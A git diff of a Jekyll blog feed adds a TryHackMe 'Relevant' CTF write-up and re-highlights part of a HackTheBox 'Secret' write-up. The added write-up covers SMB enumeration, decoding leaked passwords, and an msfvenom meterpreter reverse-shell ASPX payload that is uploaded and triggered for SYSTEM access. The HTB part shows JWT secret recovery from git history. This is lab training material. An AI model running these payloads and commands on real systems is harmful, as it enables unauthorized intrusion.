@@ -1,4 +1,168 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-16T21:52:55-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jennifer Reeves</title><subtitle>IT Security Enthusiast</subtitle><entry><title type="html">HackTheBox - Secret</title><link href="http://localhost:4000/HTB-Secret/" rel="alternate" type="text/html" title="HackTheBox - Secret" /><published>2022-03-15T00:00:00-04:00</published><updated>2022-03-15T00:00:00-04:00</updated><id>http://localhost:4000/HTB-Secret</id><content type="html" xml:base="http://localhost:4000/HTB-Secret/">&lt;p&gt;&lt;em&gt;Can you keep a secret?&lt;/em&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-17T23:20:27-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jennifer Reeves</title><subtitle>IT Security Enthusiast</subtitle><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/Relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2022-03-17T00:00:00-04:00</published><updated>2022-03-17T00:00:00-04:00</updated><id>http://localhost:4000/Relevant</id><content type="html" xml:base="http://localhost:4000/Relevant/">&lt;p&gt;AcousticGirl
+March 17, 2022&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;IP = 10.10.201.49&lt;/p&gt;
+
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Rustscan w/Nmap
+```
+PORT      STATE SERVICE            REASON  VERSION
+80/tcp    open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|&lt;em&gt;http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|&lt;/em&gt;  Potentially risky methods: TRACE
+|&lt;em&gt;http-title: IIS Windows Server
+135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server? syn-ack
+| ssl-cert: Subject: commonName=Relevant
+| Issuer: commonName=Relevant
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-03-17T01:15:08
+| Not valid after:  2022-09-16T01:15:08
+| MD5:   42a4 a8c4 a4d5 43af 1f7e e6a7 88fe 4373
+| SHA-1: 2a2c 5af2 116e 6673 7a55 c523 3c37 0cf2 3eeb c089
+| —–BEGIN CERTIFICATE—–
+| MIIC1DCCAbygAwIBAgIQEkeU/ZJCmK9J6QDJRpgLmDANBgkqhkiG9w0BAQsFADAT
+| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjAzMTcwMTE1MDhaFw0yMjA5MTYwMTE1
+| MDhaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEA7ahxwPyNn7Abaj+oCzoOo83ho2xv4Oa7t0vA1uNos5FliGRzjEIg
+| MR2goaz7E8tkbU3yawvx/v6/DUxsIkOu6J4Ls/VI3BBMxeE/1GbC0OSlLEoeIe88
+| iPzXLcZy4lmC5Bk54T3XS6NPBFDU0ut/cjr4XyFcY1ah5A3D4sDZkQFCeR0slOTQ
+| QzyCDPsF3VwTWT7lCBDpFAq2KKFQd7pF/kopJc8qZqr2BPHJIu5tKxNIuaR9AFml
+| OHsr4F9XLAXjj/kRu18P68Zl37xFAyGg/dD1fvEADcShCtFA4Zx2xm7sUMrS2cIq
+| PTUo6uznY58MQLL3u9+RWvpX56/T7MrEiQIDAQABoyQwIjATBgNVHSUEDDAKBggr
+| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKXimMiHwlcM
+| 7KZmUN40eayEpReWmcx/so+zon7+bIIQNLktZZKqEEP1NPAODAdgsNsvP6s/3tuI
+| 4m6/IAgQZAFXEHQ9GZ5S6rjZCA7B0YpZ5kqC1NQUWAzgFiN0gB62tPHGKtDm6n1u
+| Mg97IlQrfvECo6ktKIF4fGVyzdyIHUD9TY/itfi0RylTvVpjauwO3TSv+Q147A7l
+| 2a+jlMWATm0yLYzbw2kT87HjpA7gNKu5IHk/fALDE+n7L2UdjqPsTP3Supto1HWm
+| MRhyAgri2sHL7cysJ0CjXh7JEMOobyBeiAvkYOVagfCCS42GlTyIOCNg1fU7zBMd
+| Iek/wk6cZVw=
+|&lt;/em&gt;—–END CERTIFICATE—–
+|&lt;em&gt;ssl-date: 2022-03-18T01:28:58+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|&lt;/em&gt;  System_Time: 2022-03-18T01:28:19+00:00
+49663/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|&lt;em&gt;http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|&lt;/em&gt;  Potentially risky methods: TRACE
+49668/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc              syn-ack Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher…
+|   Check 1 (port 12736/tcp): CLEAN (Timeout)
+|   Check 2 (port 22316/tcp): CLEAN (Timeout)
+|   Check 3 (port 31614/udp): CLEAN (Timeout)
+|   Check 4 (port 23888/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|&lt;em&gt;clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|&lt;/em&gt;  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-18T01:28:21
+|_  start_date: 2022-03-18T01:15:08
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-03-17T18:28:22-07:00&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+- Gobuster
+	- No results
+
+## 2. SMB
+- Connect to SMB share
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;└─$ smbclient //10.10.201.49/nt4wrksv           &lt;br /&gt;
+Enter WORKGROUP\acousticgirl’s password: 
+Try “help” to get a list of possible commands.
+smb: &amp;gt; ls -la
+NT_STATUS_NO_SUCH_FILE listing -la
+smb: &amp;gt; ls
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	7735807 blocks of size 4096. 5138781 blocks available ``` - Download passwords.txt ``` smb: \&amp;gt; get passwords.txt  getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) ``` - Decode entries in passwords.txt ``` ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant] └─$ cat passwords.txt         [User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                                                                           ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant] └─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d Bob - !P@$$W0rD!123                                                                                                                                                                                  ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant] └─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d Bill - Juw4nnaM4n420696969!$$$   ```
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;3-gaining-shell&quot;&gt;3. Gaining Shell&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to craft a payload to upload to the SMB share
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant]
+└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.6.8.143 lport=4444 -f aspx -o pwn.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Upload file to SMB
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ smbclient //10.10.234.85/nt4wrksv                                        
+Enter WORKGROUP\acousticgirl's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; mput pwn2.aspx
+Put file pwn.aspx? y
+putting file pwn.aspx as \pwn2.aspx (750.4 kb/s) (average 750.4 kb/s)
+smb: \&amp;gt; exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Start Meterpreter Handler
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter_reverse_tcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Activate malicious .aspx file
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ curl http://10.10.234.85:49663/nt4wrksv/pwn.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Enter Command Shell
+```
+meterpreter &amp;gt; sessions 11
+meterpreter &amp;gt; shell
+Process 3628 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;c:\windows\system32\inetsrv&amp;gt;whoami
+whoami
+nt authority\system&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- **SUCCESS!!** You are now in as NT Authority\SYSTEM user
+
+## 4. User Flag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;c:\Users\Bob\Desktop&amp;gt;type user.txt&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+## 5. Root Flag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;c:\Users\Administrator\Desktop&amp;gt;type root.txt
+```&lt;/p&gt;</content><author><name></name></author><category term="THM" /><category term="CTF" /><category term="SMB" /><summary type="html">AcousticGirl March 17, 2022</summary></entry><entry><title type="html">HackTheBox - Secret</title><link href="http://localhost:4000/HTB-Secret/" rel="alternate" type="text/html" title="HackTheBox - Secret" /><published>2022-03-15T00:00:00-04:00</published><updated>2022-03-15T00:00:00-04:00</updated><id>http://localhost:4000/HTB-Secret</id><content type="html" xml:base="http://localhost:4000/HTB-Secret/">&lt;p&gt;&lt;em&gt;Can you keep a secret?&lt;/em&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -80,9 +244,9 @@
   &lt;li&gt;Two hidden items in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web&lt;/code&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt;
     &lt;ul&gt;
       &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; has the Token &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; in it!
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ ls -la
-  total 116
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;  total 116
   drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  3  2021 .
   drwxr-xr-x   3 acousticgirl acousticgirl  4096 Mar 14 22:22 ..
   -rw-rw-r--   1 acousticgirl acousticgirl    72 Sep  3  2021 .env
@@ -98,10 +262,10 @@
   -rw-rw-r--   1 acousticgirl acousticgirl   651 Aug 13  2021 validations.js
                                                                                                                                                                              
   ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ cat .env               
-  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .env               
+&lt;span class=&quot;go&quot;&gt;  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
   *TOKEN_SECRET = secret*
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
@@ -131,49 +295,49 @@
   &lt;li&gt;Attempted user replacement
     &lt;ul&gt;
       &lt;li&gt;Attempt
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -i -X POST \
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  curl -i -X POST \
 -H 'Content-Type: application/json' \
 -d '{&quot;name&quot;:&quot; theadmin&quot;, &quot;email&quot;:&quot;drt@dasith.works&quot;, &quot;password&quot;:&quot;testpassword&quot;}' \
 http://10.10.11.120/api/user/register
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
       &lt;li&gt;
         &lt;p&gt;Success! (but not really)&lt;/p&gt;
 
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  HTTP/1.1 200 OK
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 01:59:53 GMT
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 20
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Content-Type: application/json;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&quot;go&quot;&gt;  Content-Length: 20
   Connection: keep-alive
   X-Powered-By: Express
   ETag: W/&quot;14-LWrfBFPQd+iUl+P35I+Rt9MzQss&quot;
 
   {&quot;user&quot;:&quot; theadmin&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
       &lt;li&gt;The user was created but it is ` theadmin&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; and not &lt;/code&gt;theadmin` (notice the leading space). However, they both use the same email address.
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -i -X POST \
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  curl -i -X POST \
   -H 'Content-Type: application/json' \
   -d '{&quot;email&quot;:&quot;drt@dasith.works&quot;, &quot;password&quot;:&quot;testpassword&quot;}' \
   http://10.10.11.120/api/user/login
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
       &lt;li&gt;
         &lt;p&gt;Successfully logged in with ` theadmin` email and got our JWT:&lt;/p&gt;
 
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  HTTP/1.1 200 OK
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 02:04:48 GMT
-  Content-Type: text/html; charset=utf-8
-  Content-Length: 211
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Content-Type: text/html;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&quot;go&quot;&gt;  Content-Length: 211
   Connection: keep-alive
   X-Powered-By: Express
   auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls
   ETag: W/&quot;d3-AbKQ3P+XBBjA9PHtvEjPlyeZqFA&quot;
 
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
@@ -187,22 +351,22 @@ http://10.10.11.120/api/user/register
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Lets test our token
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -X POST http://10.10.11.120:3000/api/user/login
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  curl -X POST http://10.10.11.120:3000/api/user/login
  -H &quot;Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}&quot;
  -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’
 
  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
- └─$ curl -i http://10.10.11.120:3000/api/priv 
- HTTP/1.1 401 Unauthorized
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; http://10.10.11.120:3000/api/priv 
+&lt;span class=&quot;go&quot;&gt; HTTP/1.1 401 Unauthorized
  X-Powered-By: Express
- Content-Type: text/html; charset=utf-8
- Content-Length: 13
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; Content-Type: text/html;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&quot;go&quot;&gt; Content-Length: 13
  ETag: W/&quot;d-Fke522wB/f0WEQT+w6CDKWhElh4&quot;
  Date: Tue, 15 Mar 2022 03:41:39 GMT
  Connection: keep-alive
 
  Access Denied         
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Access is still denied so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; must not be the correct key for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theadmin&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -213,42 +377,42 @@ http://10.10.11.120/api/user/register
   &lt;li&gt;
     &lt;p&gt;Let’s look at the git logs to see if anything changed&lt;/p&gt;
 
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
-  └─$ git log                                         
-  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&amp;gt; master)
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Thu Sep 9 00:03:27 2021 +0530
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;git log                                         
+&lt;span class=&quot;gp&quot;&gt;  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;master&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Thu Sep 9 00:03:27 2021 +0530
 
       now we can view logs from server 😃
 
   commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Fri Sep 3 11:30:17 2021 +0530
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Fri Sep 3 11:30:17 2021 +0530
 
       removed .env for security reasons
 
   commit de0a46b5107a2f4d26e348303e76d85ae4870934
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Fri Sep 3 11:29:19 2021 +0530
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Fri Sep 3 11:29:19 2021 +0530
 
       added /downloads
 
   commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Fri Sep 3 11:27:35 2021 +0530
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Fri Sep 3 11:27:35 2021 +0530
 
       removed swap
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
 
     &lt;ul&gt;
       &lt;li&gt;
         &lt;p&gt;This line looks promising - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;removed .env for security reasons&lt;/code&gt; so lets look at that commit&lt;/p&gt;
 
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ git log -p  -- .env    
-  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Fri Sep 3 11:30:17 2021 +0530
+        &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; .env    
+&lt;span class=&quot;go&quot;&gt;  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
